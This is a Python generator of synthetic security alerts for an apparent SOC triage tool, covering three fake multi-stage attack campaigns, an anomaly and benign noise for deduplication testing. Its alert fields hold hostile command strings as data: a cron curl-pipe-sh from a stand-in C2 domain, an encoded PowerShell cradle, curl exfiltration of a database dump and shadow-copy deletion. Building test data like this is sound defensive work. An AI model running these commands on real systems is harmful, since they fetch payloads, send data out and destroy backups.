"""
ThreatLens Enterprise Synthetic Security Alert Generator
Generates high-volume, multi-source telemetry injected with simultaneous independent attack campaigns,
novel behavioral anomalies, repetitive noise for deduplication testing, and ground-truth labels.
"""
import random
import uuid
from datetime import datetime, timedelta
from typing import List, Dict, Any
from app.models.schemas import AlertSource, Severity, NormalizedAlert
from app.engine.normalizer import AlertNormalizer


class SyntheticAlertGenerator:
    ATTACK_CAMPAIGNS_DEF = [
        {
            "campaign_name": "Operation Cobalt Tempest (APT29)",
            "external_ip": "198.51.100.22",
            "c2_domain": "update-sync-telemetry.org",
            "target_host": "EXEC-LAPTOP-CEO",
            "target_ip": "10.0.5.88",
            "pivot_host": "CORP-DC-01",
            "pivot_ip": "10.0.1.10",
            "user": "ceo_m_vance",
            "malware_hash": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
            "stages": [
                {
                    "source": AlertSource.EDR,
                    "rule": "Spearphishing Attachment Opened in Outlook",
                    "type": "Phishing Attachment Execution",
                    "severity": Severity.HIGH,
                    "process": "outlook.exe -> excel.exe",
                    "tactic": "Initial Access",
                    "tech_id": "T1566.001",
                    "tech_name": "Spearphishing Attachment",
                    "msg": "Excel macro initiated anomalous hidden shell process"
                },
                {
                    "source": AlertSource.WINDOWS_EVENTS,
                    "rule": "Obfuscated PowerShell Download Cradle",
                    "type": "PowerShell Script Execution",
                    "severity": Severity.HIGH,
                    "process": "powershell.exe -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAA=",
                    "tactic": "Execution",
                    "tech_id": "T1059.001",
                    "tech_name": "PowerShell Execution",
                    "msg": "Event 4688: Encoded command line invocation retrieving payload from update-sync-telemetry.org"
                },
                {
                    "source": AlertSource.AUTHENTICATION,
                    "rule": "Anomalous Token Usage & Valid Accounts Login",
                    "type": "Suspicious Cloud Authentication",
                    "severity": Severity.MEDIUM,
                    "process": "svchost.exe",
                    "tactic": "Defense Evasion",
                    "tech_id": "T1078",
                    "tech_name": "Valid Accounts",
                    "msg": "OAuth token replay detected originating from untrusted autonomous system"
                },
                {
                    "source": AlertSource.EDR,
                    "rule": "Mimikatz LSASS Memory Harvest",
                    "type": "OS Credential Dumping",
                    "severity": Severity.CRITICAL,
                    "process": "mimikatz.exe (injected into spoolsv.exe)",
                    "tactic": "Credential Access",
                    "tech_id": "T1003.001",
                    "tech_name": "OS Credential Dumping: LSASS Memory",
                    "msg": "ReadProcessMemory handle open against LSASS.exe by unsigned binary"
                },
                {
                    "source": AlertSource.FIREWALL,
                    "rule": "Lateral Movement via SMB Admin Shares",
                    "type": "Lateral Network Connection",
                    "severity": Severity.HIGH,
                    "process": "net.exe use \\\\CORP-DC-01\\C$",
                    "tactic": "Lateral Movement",
                    "tech_id": "T1021.002",
                    "tech_name": "Remote Services: SMB/Windows Admin Shares",
                    "msg": "Traffic match: TCP/445 high-frequency IPC$ administrative query"
                }
            ]
        },
        {
            "campaign_name": "Campaign Silent Hydra (FIN7 Variant)",
            "external_ip": "203.0.113.88",
            "c2_domain": "billing-gateway-api.com",
            "target_host": "PAYMENT-GW-01",
            "target_ip": "10.0.3.15",
            "pivot_host": "PROD-DB-PRIMARY",
            "pivot_ip": "10.0.2.50",
            "user": "srv_payment_app",
            "malware_hash": "8f434346648f6b96df89dda901c5176b10a6d83961dd3c1ac88b59b2dc327aa4",
            "stages": [
                {
                    "source": AlertSource.APPLICATION_LOGS,
                    "rule": "SQL Injection Pattern Detected in Payment API",
                    "type": "Web Application Exploitation",
                    "severity": Severity.CRITICAL,
                    "process": "node.exe /api/checkout",
                    "tactic": "Initial Access",
                    "tech_id": "T1190",
                    "tech_name": "Exploit Public-Facing Application",
                    "msg": "UNION SELECT syntax detected in transaction verification parameter"
                },
                {
                    "source": AlertSource.LINUX_LOGS,
                    "rule": "Web Shell Execution via Cron",
                    "type": "Scheduled Task / Job",
                    "severity": Severity.HIGH,
                    "process": "/bin/sh -c 'curl http://billing-gateway-api.com/sh.elf | sh'",
                    "tactic": "Persistence",
                    "tech_id": "T1053.005",
                    "tech_name": "Scheduled Task",
                    "msg": "Crontab entry modified by www-data user account"
                },
                {
                    "source": AlertSource.ZEEK_NETWORK,
                    "rule": "Internal Reconnaissance: Port Scan Sweep",
                    "type": "Network Service Discovery",
                    "severity": Severity.MEDIUM,
                    "process": "masscan_raw",
                    "tactic": "Discovery",
                    "tech_id": "T1046",
                    "tech_name": "Network Service Discovery",
                    "msg": "TCP SYN probe across subnet 10.0.2.0/24 port 5432 (PostgreSQL)"
                },
                {
                    "source": AlertSource.FIREWALL,
                    "rule": "High-Volume Data Egress / Exfiltration",
                    "type": "Data Exfiltration to External Host",
                    "severity": Severity.CRITICAL,
                    "process": "gzip -> curl -T dump.sql.gz",
                    "tactic": "Exfiltration",
                    "tech_id": "T1567",
                    "tech_name": "Exfiltration Over Web Service",
                    "msg": "4.2 GB transmitted to 203.0.113.88 over port 443 in 12 minutes"
                }
            ]
        },
        {
            "campaign_name": "Ransomware Staging on Developer Subnet",
            "external_ip": "194.26.29.112",
            "c2_domain": "dev-packages-mirror.org",
            "target_host": "DEV-WORKSTATION-12",
            "target_ip": "10.0.5.110",
            "pivot_host": "DEV-WORKSTATION-12",
            "pivot_ip": "10.0.5.110",
            "user": "dev_alex",
            "malware_hash": "b2f5ff47436671b6e533d8dc3614845d80ceee8",
            "stages": [
                {
                    "source": AlertSource.EDR,
                    "rule": "Malicious Package Dropper Execution",
                    "type": "Suspicious Executable Launch",
                    "severity": Severity.MEDIUM,
                    "process": "npm install malicious-typosquat",
                    "tactic": "Execution",
                    "tech_id": "T1059.003",
                    "tech_name": "Windows Command Shell",
                    "msg": "Post-install script spawned hidden cmd.exe invoking certutil"
                },
                {
                    "source": AlertSource.WINDOWS_EVENTS,
                    "rule": "Registry Run Key Persistence Added",
                    "type": "Registry Modification",
                    "severity": Severity.HIGH,
                    "process": "reg.exe add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                    "tactic": "Persistence",
                    "tech_id": "T1547.001",
                    "tech_name": "Registry Run Keys / Startup Folder",
                    "msg": "Event 4657: Registry value 'WindowsSyncAgent' created pointing to temp path"
                },
                {
                    "source": AlertSource.EDR,
                    "rule": "Volume Shadow Copy Deletion",
                    "type": "Inhibit System Recovery",
                    "severity": Severity.HIGH,
                    "process": "vssadmin.exe delete shadows /all /quiet",
                    "tactic": "Impact",
                    "tech_id": "T1490",
                    "tech_name": "Inhibit System Recovery",
                    "msg": "Ransomware precursor: Shadow copies purged via admin CLI"
                }
            ]
        }
    ]

    BENIGN_NOISE_PATTERNS = [
        {
            "source": AlertSource.FIREWALL,
            "rule": "Vulnerability Scanner Sweep (Nessus Internal)",
            "type": "Generic Security Anomaly",
            "severity": Severity.LOW,
            "msg": "Multiple inbound connections denied from authorized internal security scanner 10.0.4.101"
        },
        {
            "source": AlertSource.WINDOWS_EVENTS,
            "rule": "Automated Backup Sync Job (Scheduled)",
            "type": "Scheduled Task",
            "severity": Severity.LOW,
            "msg": "Service Account svc_backup performed scheduled snapshot archival on PROD-DB-REPLICA"
        },
        {
            "source": AlertSource.EDR,
            "rule": "Software Inventory Telemetry Agent Query",
            "type": "System Discovery",
            "severity": Severity.LOW,
            "msg": "Routine IT asset management inventory check executed across workstations"
        },
        {
            "source": AlertSource.AUTHENTICATION,
            "rule": "Repeated Kerberos Pre-Auth Failure (Typo Lockout)",
            "type": "Password Guessing",
            "severity": Severity.LOW,
            "msg": "User typo password threshold reached on workstation 10.0.5.115"
        }
    ]

    @classmethod
    def generate_alerts(cls, count: int = 3000) -> List[NormalizedAlert]:
        """
        Generates 'count' realistic alerts:
        - Injects 3 high-fidelity multi-stage attack campaigns with distinct causal kill-chains
        - Injects 1 potential novel behavioral anomaly attack
        - Fills the remaining volume with repetitive benign & noisy alerts (85%+ duplication)
          to replicate the real-world '3,000 Alerts, One Analyst' scenario!
        """
        base_time = datetime.utcnow() - timedelta(hours=2)
        alerts: List[NormalizedAlert] = []

        # 1. Generate multi-stage attack campaign alerts
        for campaign in cls.ATTACK_CAMPAIGNS_DEF:
            c_name = campaign["campaign_name"]
            stages = campaign["stages"]
            
            for stage_idx, stage in enumerate(stages):
                # Primary attack alert
                t_offset = timedelta(minutes=stage_idx * 12 + random.randint(1, 5))
                alert_time = (base_time + t_offset).isoformat() + "Z"
                
                raw_dict = {
                    "id": f"alt-camp-{uuid.uuid4().hex[:8]}",
                    "timestamp": alert_time,
                    "source": stage["source"].value,
                    "alert_type": stage["type"],
                    "severity": stage["severity"].value,
                    "source_ip": campaign["external_ip"] if stage_idx == 0 or "Firewall" in stage["source"].value else campaign["target_ip"],
                    "destination_ip": campaign["target_ip"] if stage_idx <= 2 else campaign["pivot_ip"],
                    "source_user": campaign["user"],
                    "host": campaign["target_host"] if stage_idx <= 2 else campaign["pivot_host"],
                    "process": stage["process"],
                    "file_hash": campaign["malware_hash"],
                    "domain": campaign["c2_domain"],
                    "detection_rule": stage["rule"],
                    "raw_message": stage["msg"],
                    "mitre_technique_id": stage["tech_id"],
                    "mitre_technique_name": stage["tech_name"],
                    "mitre_tactic": stage["tactic"],
                    "confidence": 0.94
                }
                alerts.append(AlertNormalizer.normalize(raw_dict))

                # Inject repetitive alerts for this stage (e.g., 20 repeated brute-force or C2 beacons)
                repeat_count = random.randint(8, 25)
                for _ in range(repeat_count):
                    rep_time = (base_time + t_offset + timedelta(seconds=random.randint(2, 180))).isoformat() + "Z"
                    rep_dict = dict(raw_dict)
                    rep_dict["id"] = f"alt-camp-{uuid.uuid4().hex[:8]}"
                    rep_dict["timestamp"] = rep_time
                    rep_dict["confidence"] = 0.90
                    alerts.append(AlertNormalizer.normalize(rep_dict))

        # 2. Inject Novel / Behavioral Anomaly attack (Zero-day pattern without known MITRE rule)
        novel_time = (base_time + timedelta(minutes=45)).isoformat() + "Z"
        novel_raw = {
            "id": f"alt-novel-{uuid.uuid4().hex[:8]}",
            "timestamp": novel_time,
            "source": "EDR",
            "alert_type": "Unsigned Binary Rare Execution Path",
            "severity": "HIGH",
            "source_ip": "10.0.5.92",
            "destination_ip": "198.51.100.199",
            "source_user": "finance_lead_carter",
            "host": "FIN-WORKSTATION-04",
            "process": "C:\\Users\\carter\\AppData\\Local\\Temp\\updater_x64.tmp",
            "file_hash": "d41d8cd98f00b204e9800998ecf8427e",
            "detection_rule": "Behavioral Anomaly: Off-hours Rare Binary",
            "raw_message": "Process updater_x64.tmp executed outside business hours (02:14 AM) with raw socket handle to foreign unclassified IP",
            "is_anomalous": True,
            "anomaly_reasons": [
                "Off-hours execution (02:14 AM) divergent from 30-day user baseline",
                "Execution from non-standard temporary directory (AppData\\Local\\Temp)",
                "Process has no cryptographic signature and no historical enterprise prevalence"
            ],
            "confidence": 0.88
        }
        alerts.append(AlertNormalizer.normalize(novel_raw))

        # 3. Fill the rest of the quota with repetitive benign noise (Testing the 3,000 alerts deduplication)
        remaining = max(10, count - len(alerts))
        for i in range(remaining):
            pat = random.choice(cls.BENIGN_NOISE_PATTERNS)
            t_rand = (base_time + timedelta(seconds=random.randint(0, 7200))).isoformat() + "Z"
            
            # Select target host randomly from dev/test or internal workstations
            host_options = ["DEV-SRV-TEST", "STAGING-BENCH-02", "HR-TERMINAL-01", "CORP-DC-02"]
            host_chosen = random.choice(host_options)
            meta = AlertNormalizer.resolve_asset_metadata(host_chosen)

            noise_raw = {
                "id": f"alt-noise-{uuid.uuid4().hex[:8]}",
                "timestamp": t_rand,
                "source": pat["source"].value,
                "alert_type": pat["type"],
                "severity": pat["severity"].value,
                "source_ip": "10.0.4.101" if "Scanner" in pat["rule"] else "10.0.5.115",
                "destination_ip": "10.0.2.51" if "Backup" in pat["rule"] else "10.0.1.11",
                "source_user": "svc_backup" if "Backup" in pat["rule"] else "internal_auto",
                "host": host_chosen,
                "process": "backup_agent.exe" if "Backup" in pat["rule"] else "nessus_scan.exe",
                "detection_rule": pat["rule"],
                "raw_message": pat["msg"],
                "confidence": 0.72
            }
            alerts.append(AlertNormalizer.normalize(noise_raw))

        # Shuffle slightly to simulate streaming order
        random.shuffle(alerts)
        return alerts
